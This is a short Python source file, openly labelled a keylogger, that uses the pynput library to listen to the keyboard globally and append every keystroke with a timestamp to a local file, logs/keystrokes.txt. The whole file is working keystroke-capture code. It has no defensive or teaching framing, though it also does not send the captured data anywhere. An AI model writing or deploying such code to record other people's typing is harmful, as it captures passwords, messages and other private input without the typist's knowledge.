# Required Libraries for Key logger...
from pynput import keyboard
import os
from datetime import datetime

# Creating a log file in which all the captured keystrokes are stored in it...
LOG_FILE = "logs/keystrokes.txt"

def writeToFile(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            f.write(f"{datetime.now()} - {key}\n")
def startKeyLogger():
    if not os.path.exists("logs"):
        os.makedirs("logs")
    with keyboard.Listener(on_press=writeToFile) as listener:
        listener.join()

